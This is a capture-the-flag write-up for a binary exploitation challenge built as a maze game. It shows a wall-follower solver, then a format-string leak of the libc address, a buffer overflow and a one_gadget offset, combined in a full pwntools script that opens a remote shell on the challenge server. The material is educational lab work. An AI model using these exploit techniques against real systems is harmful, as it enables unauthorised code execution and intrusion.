# 23 - The Maze

Can you beat the maze? This one is tricky - simply finding the exit, isn't enough!

```
nc whale.hacking-lab.com 7331
```

[maze](files/maze)

### Solution

Provided binary was a stripped 64-bit ELF executable.

```
$ file maze 
maze: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.0.0, BuildID[sha1]=1a30ee698ef00862581bf5256a0d2ac6764c02d5, stripped
```

I ran it and the game asked for my name.

```
$ ./maze
Please enter your name:
> 
```

Then it showed me the main prompt.

```
Choose:
[1] Change User
[2] Help
[3] Play
[4] Exit
> 
```

I chose the second option to view the help.

```
To navigate through the maze use the following commands:
  - go <direction>	(north, south, west, east)
  - search
  - pick up
  - open
  - exit

Press enter to resume to the menue.
```

The instructions were clear so I directly started the game.

```
Your position:





         +-----+-----+
         |           |
         |  X        |
         |           |
         +-----+     +
               |     |
               |     |
               |     |
               +     +




Enter your command:
>
```

#### Maze Solver

The game used simple TUI to visualize the maze. The goal of the game was to find the key and open the chest hidden somewhere in the maze. To do so I wrote a Python maze solver based on the [Wall Follower](https://en.wikipedia.org/wiki/Maze_solving_algorithm#Wall_follower) algorithm and let him to do the job.

```python
from pwn import *
import re

remote_solver = len(sys.argv) > 1 and sys.argv[1] == 'remote'

p = remote('whale.hacking-lab.com', 7331) if remote_solver else process('./maze')

directions = [ 'north', 'east', 'south', 'west' ]

def right_of(current_dir):
    return directions[(directions.index(current_dir) + 1) % len(directions)]

def left_of(current_dir):
    return directions[(directions.index(current_dir) + len(directions) - 1) % len(directions)]

# read init
print p.recvuntil('> ')

# set player name
p.sendline('pjslf')
print p.recvuntil('> ')

# start the game
p.sendline('3')
print p.recvuntil('> ')

key = None
current_direction = 'north'

# play the game
while True:
    p.sendline('go ' + current_direction)
    maze = p.recvuntil('> ')
    facing_wall = 'There is a wall!' in maze

    p.sendline('search')
    maze = p.recvuntil('> ')

    if 'You found a key!' in maze and key is None:
        p.sendline('pick up')
        maze = p.recvuntil('> ')
        key = re.search('You pick up the key: ([0-9a-f]+)', maze).group(1)

    if 'You found a locked chest!' in maze:
        if key is not None:
            p.sendline('open')
            print p.recvuntil('> ')

            # enter the key
            p.sendline(key)
            print p.recvuntil('Press enter to return to the menue')
            
            exit()

    print maze

    if facing_wall:
        current_direction = left_of(current_direction)
    else:
        current_direction = right_of(current_direction)
```

As a reward, I got this beautiful yet completely useless ASCII-art egg.

```
Congratulation, you solved the maze. Here is your reward:
                 *****
              ****   ****
            ***         ***
          ***             ***
        ***                 ***
      ***     ****   ****     ***
     **      ** *** **  **      **
    **           **   ***.       **
   **         .***  **  **        **
  **         ******  ****          **
 **                                 **
**        +-----------------+        **
*         | +--+ *  *  +--+ |         *
*         | |  |  ** * |  | |         *
*         | +--+ ** ** +--+ |         *
*         |  * **  ** *** * |         *
*         | * *  ** *** * * |         *
**        | +--+ * *  [] *  |        **
 *        | |  |  *** ** ** |        *
 **       | +--+ ** *** **  |       **
  **      +-----------------+      **
   **                             **
    ***                         ***
      ***                     ***
        ****               ****
           *****       *****
               *********
Press enter to return to the menue
```

#### Vulnerabilities

Since this was a dead end I decompiled the binary with IDA and started to search for vulnerabilities to exploit. I renamed the key functions and variables and added few comments to make the [decompiled code](files/maze.c) easier to understand. At the end I found two vulnerabilities.

##### String Format

The fist vulnerability was found in the [`play_game`](files/maze.c#L259-L263) function. User input in the form of the player name was directly passed to the `printf` as the `format` parameter which allowed me to access the content of the stack. 

```c
if ( !(unsigned int)xored_equals(command, "5*-#/+HB") ) // whoami
{
  printf(&player_name, "5*-#/+HB");
  goto LABEL_67;
}
```

To trigger this vulnerability I had to use an undocumented command `whoami` during the game.

##### Buffer Overflow

The second vulnerability was a classical buffer overflow found in the [`play_game`](files/maze.c#L290-L301) function.

```c
printf("The chest is locked. Please enter the key:\n> ");
fflush(stdout);
fgets(key, 40, stdin);
if ( !strchr(key, 10) )
{
  while ( fgetc(stdin) != 10 ) ;
}
fflush(stdin);
v2 = strlen(s1);
if ( !strncmp(s1, key, v2) )
  break;
puts("Sorry but that was the wrong key.");
``` 

The game read up to 40 characters from the standard input using a `fgets` call and wrote them into a smaller buffer whose length was only 32 bytes. This allowed me to use the remaining 8 bytes to overwrite the offset of the `error` function stored right behind the key in the memory.

```
.data:0000000000603140 ; char key[2]
.data:0000000000603140 key             db 0Ah,0                ; DATA XREF: play_game+5F3↑o
.data:0000000000603140                                         ; play_game+602↑o ...
.data:0000000000603142                 align 20h
.data:0000000000603160 functions_table dq offset error         ; DATA XREF: main+120↑r
.data:0000000000603168                 dq offset set_player_name
.data:0000000000603170                 dq offset print_help
.data:0000000000603178                 dq offset play_game
.data:0000000000603180                 dq offset exit_game
.data:0000000000603180 _data           ends
```

#### Exploit

The idea of exploitation was straightforward.

 1. Leak `libc` base address to bypass ASLR.
    - Leak an address of a `libc` function using the string format vulnerability in the `whoami` command.
    - Identify the `libc` version and calculate the function offset.
    - Calculate `libc` base address.
 2. Find a suitable one-gadget RCE in the `libc`.
 3. Solve the maze and submit a poisonous key to overwrite the offset of the `error` function with the RCE gadget address.
 4. End the game and cause an error to jump to the new offset to spawn a shell.

##### Leak libc base address

I ran the binary locally in `gdb` and put a breakpoint right before the vulnerable `printf` call to see what can be found on the stack.

```
$ gdb ./maze
GNU gdb (Debian 8.2.1-2) 8.2.1
... (snip) ...
Reading symbols from ./maze...(no debugging symbols found)...done.
gdb-peda$ b *0x401E17
Breakpoint 1 at 0x401e17
gdb-peda$ r
Starting program: ./maze
... (snip) ...
Breakpoint 1, 0x0000000000401e17 in ?? ()
gdb-peda$ telescope 14
0000| 0x7fffffffe050 --> 0x6031a0 --> 0x7ffff7fa6760 --> 0xfbad2a84 
0008| 0x7fffffffe058 --> 0x7ffff7fa6760 --> 0xfbad2a84 
0016| 0x7fffffffe060 --> 0x7ffff7fa22a0 --> 0x0 
0024| 0x7fffffffe068 --> 0x7ffff7e59d2d (<__GI__IO_fflush+157>:	xor    edx,edx)
0032| 0x7fffffffe070 --> 0x0 
0040| 0x7fffffffe078 --> 0xe700000000 
0048| 0x7fffffffe080 --> 0x7fffffffe0b0 --> 0x401fc0 (push   r15)
0056| 0x7fffffffe088 --> 0x401fac (mov    DWORD PTR [rbp-0x14],0x0)
0064| 0x7fffffffe090 --> 0x401fc0 (push   r15)
0072| 0x7fffffffe098 --> 0x300400a60 
0080| 0x7fffffffe0a0 --> 0x401656 (push   rbp)
0088| 0x7fffffffe0a8 --> 0xa00000000000000 ('')
0096| 0x7fffffffe0b0 --> 0x401fc0 (push   r15)
0104| 0x7fffffffe0b8 --> 0x7ffff7e0e09b (<__libc_start_main+235>:	mov    edi,eax)
```

Luckily I quickly found what I was looking for. The address of the `__libc_start_main+235`, i.e. address of some instruction of the `__libc_start_main` function from the local `libc`.

Now I had to find the right format pattern to set as the player name to be able to read this value from the stack without a debugger. I wrote another Python script which controlled the game using [pwnlib.tubes](http://docs.pwntools.com/en/stable/tubes.html) and iteratively tried to set and print names of `%<num>$p` format until it found the right value of `num`, which was 19. I verified that setting the name to `%19$p` successfully leaked the address on sending `whoami` command. 

To calculate the address of the `__libc_start_main` function itself I simply subtracted 235 from the address found on the stack. That gave me `0x7ffff7e0dfb0`. I quickly [verified](https://libc.blukat.me/?q=__libc_start_main%3Afb0) that the function offset indeed matched my local `libc` version. Then I decompiled the `libc` binary to find out that the `__libc_start_main` function starts at offset `0x23fb0`. Now I had all the information needed to calculate the `libc` base address in the memory.

Things got a bit more complicated when it came to the remote version. The pattern to leak the `__libc_start_main+<instr_offset>` address on the stack was identical, but since I didn't know the value of the instruction offset I had to identify the version of `libc` used on the remote server first.

I modified my previous stack-traversal script a bit to try to find any other useful information on the remote stack. It found `Xenial Xerus`, a code name of Ubuntu 16.04 LTS, which was enough. I downloaded the `libc` deb package from the [distribution repository](https://ubuntu.pkgs.org/16.04/ubuntu-updates-main-amd64/libc6_2.23-0ubuntu11_amd64.deb.html) and extracted the library binary from it. It was an older version 2.23.

To find the right instruction offset within the Ubuntu version, I decompiled both `libc` versions with IDA. First I looked at the instruction offset `__libc_start_main+235` of my local version. Its value was calculated as `0x23fb0 + 235 = 0x2409b`.

```
.text:000000000002409B loc_2409B:                              ; CODE XREF: __libc_start_main+15A↓j
.text:000000000002409B                 mov     edi, eax
.text:000000000002409D                 call    exit
```

It was one instruction right before the `exit` call. I successfully found the same two instructions in the remote version at `0x20830`.

```
.text:0000000000020830 loc_20830:                              ; CODE XREF: __libc_start_main+134↓j
.text:0000000000020830                 mov     edi, eax
.text:0000000000020832                 call    exit
```

Since I knew the `__libc_start_main` offset from the decompiled code I calculated the remote instruction offset within the function as `0x20830 - 0x20740 = 240`.

I wrote this Python script to automate both local and remote `libc` base address leakage. 

```python
from pwn import *
import re

remote_leak = len(sys.argv) > 1 and sys.argv[1] == 'remote'

p = remote('whale.hacking-lab.com', 7331) if remote_leak else process('./maze')

def find_libc_start_main_addr(instr_offset):
    # change name to string format pattern
    p.sendline('1')
    p.recvuntil('> ')
    p.sendline('%19$p')
    p.recvuntil('> ')

    # start the game
    p.sendline('3')
    p.recvuntil('> ')

    # run whoami command to read the libc address
    p.sendline('whoami')
    response = p.recvuntil('> ')
    libc_start_main_addr_with_instr_offset = re.search('(0x[0-9a-f]+)', response).group(1)

    # exit current game
    p.sendline('exit')
    p.recvuntil('> ')

    return int(libc_start_main_addr_with_instr_offset, 16) - instr_offset

# read init
p.recvuntil('> ')

# set player name
p.sendline('pjslf')
p.recvuntil('> ')

if remote_leak:
    # remote libc-2.23.so
    libc_start_main_instr_offset = 240
    libc_start_main_offset = 0x20740
else:
    # local libc-2.28.so
    libc_start_main_instr_offset = 235
    libc_start_main_offset = 0x23fb0

# find libc address
libc_start_main_addr = find_libc_start_main_addr(libc_start_main_instr_offset)
libc_base_addr = libc_start_main_addr - libc_start_main_offset
print 'libc_start_main_offset: ', hex(libc_start_main_offset)
print 'libc_start_main_addr:   ', hex(libc_start_main_addr)
print 'libc_base_addr:         ', hex(libc_base_addr)

# end the game
p.sendline('4')
p.close()
```

##### Find one-gadget RCE

To find RCE gadgets I used a tool called [one_gadget](https://github.com/david942j/one_gadget) which worked flawlessly.

Local `libc` version:

```
$ one_gadget libc-2.28-debian10_amd64.so 
0x4484f execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x448a3 execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xe5456 execve("/bin/sh", rsp+0x60, environ)
constraints:
  [rsp+0x60] == NULL
```

Remote `libc` version:

```
$ one_gadget libc6_2.23-0ubuntu11_amd64.so 
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

Once again I ran the binary in `gdb` to find out which of the constraints are met. The first one I found was `[rsp+0x30] == NULL` so I modified the previous script accordingly.

```python
if remote_exploit:
    # remote libc-2.23.so
    libc_start_main_instr_offset = 240
    libc_start_main_offset = 0x20740
    libc_rce_gadget_offset = 0x4526a
else:
    # local libc-2.28.so
    libc_start_main_instr_offset = 235
    libc_start_main_offset = 0x23fb0
    libc_rce_gadget_offset = 0x448a3
```  

##### Spawn a shell

Now it was time to get back to my original maze solver script, combine it with the address leakage script and modify it to submit a poisonous key to overwrite the offset of the `error` function with the address of the RCE gadget.

I looked at the vulnerable code once again.

```c
printf("The chest is locked. Please enter the key:\n> ");
fflush(stdout);
fgets(key, 40, stdin);
if ( !strchr(key, 10) )
{
  while ( fgetc(stdin) != 10 ) ;
}
fflush(stdin);
v2 = strlen(s1);
if ( !strncmp(s1, key, v2) )
  break;
puts("Sorry but that was the wrong key.");
```

Since it compared the submitted key with the expected one using `strncmp` function with the length of expected key I could simply append the calculated address of the RCE gadget to the key I found in the maze and it still passed the comparison test successfully.

```python
# find rce gadget address
libc_rce_gadget_addr = libc_base_addr + libc_rce_gadget_offset
print 'libc_rce_gadget_offset: ', hex(libc_rce_gadget_offset)
print 'libc_rce_gadget_addr:   ', hex(libc_rce_gadget_addr)

def create_poisonous_key(found_key, target_addr):
    return found_key + p64(target_addr)
```

The last missing piece was to force the game to jump to the overwritten address. It was easily accomplished by entering `0` as the choice in the main prompt.

This is the final script which combined all the previous steps together to spawn a shell and switch to interactive mode to pass the control.

```python
from pwn import *
import re

remote_exploit = len(sys.argv) > 1 and sys.argv[1] == 'remote'

p = remote('whale.hacking-lab.com', 7331) if remote_exploit else process('./maze')

directions = [ 'north', 'east', 'south', 'west' ]

def right_of(current_dir):
    return directions[(directions.index(current_dir) + 1) % len(directions)]

def left_of(current_dir):
    return directions[(directions.index(current_dir) + len(directions) - 1) % len(directions)]

def find_libc_start_main_addr(instr_offset):
    # change name to string format pattern
    p.sendline('1')
    p.recvuntil('> ')
    p.sendline('%19$p')
    p.recvuntil('> ')

    # start the game
    p.sendline('3')
    p.recvuntil('> ')

    # run whoami command to read the libc address
    p.sendline('whoami')
    response = p.recvuntil('> ')
    libc_start_main_addr_with_instr_offset = re.search('(0x[0-9a-f]+)', response).group(1)

    # exit current game
    p.sendline('exit')
    p.recvuntil('> ')

    return int(libc_start_main_addr_with_instr_offset, 16) - instr_offset

def create_poisonous_key(found_key, target_addr):
    return found_key + p64(target_addr)

# read init
p.recvuntil('> ')

# set player name
p.sendline('pjslf')
p.recvuntil('> ')

if remote_exploit:
    # remote libc-2.23.so
    libc_start_main_instr_offset = 240
    libc_start_main_offset = 0x20740
    libc_rce_gadget_offset = 0x4526a
else:
    # local libc-2.28.so
    libc_start_main_instr_offset = 235
    libc_start_main_offset = 0x23fb0
    libc_rce_gadget_offset = 0x448a3

# find libc address
libc_start_main_addr = find_libc_start_main_addr(libc_start_main_instr_offset)
libc_base_addr = libc_start_main_addr - libc_start_main_offset
print 'libc_start_main_offset: ', hex(libc_start_main_offset)
print 'libc_start_main_addr:   ', hex(libc_start_main_addr)
print 'libc_base_addr:         ', hex(libc_base_addr)

# find rce gadget address
libc_rce_gadget_addr = libc_base_addr + libc_rce_gadget_offset
print 'libc_rce_gadget_offset: ', hex(libc_rce_gadget_offset)
print 'libc_rce_gadget_addr:   ', hex(libc_rce_gadget_addr)

# start the game
p.sendline('3')
print p.recvuntil('> ')

key = None
current_direction = 'north'

# play the game
while True:
    p.sendline('go ' + current_direction)
    maze = p.recvuntil('> ')
    facing_wall = 'There is a wall!' in maze

    p.sendline('search')
    maze = p.recvuntil('> ')

    if 'You found a key!' in maze and key is None:
        p.sendline('pick up')
        maze = p.recvuntil('> ')
        key = re.search('You pick up the key: ([0-9a-f]+)', maze).group(1)

    if 'You found a locked chest!' in maze:
        if key is not None:
            p.sendline('open')
            print p.recvuntil('> ')

            # enter the poisonous key to change offset to the "error" function
            poisonous_key = create_poisonous_key(key, libc_rce_gadget_addr)
            p.sendline(poisonous_key)
            p.recvuntil('Press enter to return to the menue')

            # return to the main menu
            p.sendline()
            p.recvuntil('> ')

            # spawn shell
            p.sendline('0')
            p.interactive()
            exit()

    print maze

    if facing_wall:
        current_direction = left_of(current_direction)
    else:
        current_direction = right_of(current_direction)
```

##### Get the egg

I ran my exploit script and waited until the maze solver did his job and I got the shell. The real egg was located in the home directory of the `maze` user. I copied it directly from the console as a Base64 encoded string and stored it locally as [egg.base64](files/egg.base64).

```
$ ./maze_rce.py remote
[+] Opening connection to whale.hacking-lab.com on port 7331: Done
libc_start_main_offset:  0x20740
libc_start_main_addr:    0x7f3449a0d740
libc_base_addr:          0x7f34499ed000
libc_rce_gadget_offset:  0x4526a
libc_rce_gadget_addr:    0x7f3449a3226a
... (snip) ...
$ id
uid=1000(maze) gid=1000(maze) groups=1000(maze)
$ cd /home/maze
$ ls
egg.png
maze
$ base64 egg.png
iVBORw0KGgoAAAANSUhEUgAAAeAAAAHgCAYAAAB91L6VAAAABGdBTUEAALGPC/xhBQAAACBjSFJN
AAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAABmJLR0QA/wD/AP+gvaeTAAAA
CXBIWXMAADRjAAA0YwFVm585AAAAB3RJTUUH4wEGCRs5ve3N/QAAgABJREFUeNrsfXec5GZ9/vO+
0vTt7e5293pzvTvftjn3DtjGxqY7gEOLIQkmlB8EQ6gmgZDQAwFCCT2UQLAxxY1i46vu53I+X929
... (snip) ...
NTcrMDE6MDCFKdLpAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE5LTAxLTA2VDA4OjI3OjU3KzAxOjAw
9HRqVQAAABh0RVh0U29mdHdhcmUAcGFpbnQubmV0IDQuMS40E0BoxAAAAABJRU5ErkJggg==
```

Then I decoded it and got the egg.

```
$ base64 -d egg.base64 > egg.png
$ file egg.png
egg.png: PNG image data, 480 x 480, 8-bit/color RGBA, non-interlaced
```

### Egg

![egg.png](files/egg.png "egg.png")
